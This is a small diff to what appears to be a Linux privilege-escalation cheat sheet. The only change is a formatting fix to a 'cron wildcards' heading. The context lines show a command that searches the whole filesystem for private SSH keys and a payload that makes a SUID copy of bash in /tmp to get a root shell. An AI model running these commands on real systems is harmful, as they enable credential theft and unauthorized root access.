@@ -44,7 +44,7 @@ Finding ssh keys - ```find / -name id_rsa 2> /dev/null```
 
 ```echo "cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p" > file```
 
-###cron wildcards
+### cron wildcards
 
 ```
 
